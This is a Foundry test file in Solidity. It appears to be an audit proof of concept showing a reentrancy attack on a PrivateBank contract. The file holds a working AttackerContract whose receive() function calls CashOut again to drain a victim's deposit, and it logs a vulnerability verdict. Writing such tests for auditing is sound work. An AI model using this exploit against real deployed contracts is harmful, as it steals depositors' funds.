// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";

contract ReentrancyTest is Test {
    PrivateBank public bank;
    Log public logContract;
    address attacker = address(0xBAD);
    address victim = address(0x111);
    
    function setUp() public {
        vm.startPrank(attacker);
        logContract = new Log();
        bank = new PrivateBank(address(logContract));
        vm.stopPrank();
        
        vm.deal(victim, 1 ether);
    }

    function testReentrancyAttack() public {
        // Victim deposits funds
        vm.prank(victim);
        bank.Deposit{value: 1 ether}();

        // Create attacker contract
        AttackerContract attackerContract = new AttackerContract(address(bank));
        
        console.log("\n--- BEFORE-Trigger ---");
        uint256 preAttackBankBalance = address(bank).balance;
        uint256 preAttackAttackerBalance = address(attackerContract).balance;
        console.log("Bank contract ETH balance:", preAttackBankBalance);
        console.log("Attacker contract ETH balance:", preAttackAttackerBalance);

        console.log("--- Trigger: Attack ---");
        // Execute attack - send EXACTLY 1 ether for the deposit
        attackerContract.depositAndAttack{value: 1 ether}();

        console.log("--- AFTER-Trigger ---");
        uint256 postAttackBankBalance = address(bank).balance;
        uint256 postAttackAttackerBalance = address(attackerContract).balance;
        console.log("Bank contract ETH balance:", postAttackBankBalance);
        console.log("Attacker contract ETH balance:", postAttackAttackerBalance);

        // Check if attack successfully altered balances
        bool balancesChanged = (preAttackBankBalance > postAttackBankBalance) && 
                              (postAttackBankBalance == 0) &&
                              (preAttackAttackerBalance < postAttackAttackerBalance) &&
                              (postAttackAttackerBalance == 2 ether);
        
        console.log("Bank balance changed:", preAttackBankBalance - postAttackBankBalance, "ETH");
        console.log("Attacker balance changed:", postAttackAttackerBalance - preAttackAttackerBalance, "ETH");
        
        if (balancesChanged) {
            console.log("VERDICT: Vulnerability Exists: Reentrancy attack successfully drained bank funds");
        } else {
            console.log("VERDICT: Vulnerability not Exist: Bank funds not drained");
        }

        // Verify attacker stole both deposits (2 ether)
        assertEq(address(attackerContract).balance, 2 ether, "Attacker didn't steal funds");
        assertEq(address(bank).balance, 0, "Bank not drained");
    }
}

contract AttackerContract {
    PrivateBank public bank;
    bool private attacking;

    constructor(address _bank) {
        bank = PrivateBank(payable(_bank));
    }

    function depositAndAttack() public payable {
        // Make initial deposit
        bank.Deposit{value: msg.value}();

        // Execute attack
        attacking = true;
        bank.CashOut(msg.value);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // Reentrancy attack
            bank.CashOut(msg.value);
        }
    }
}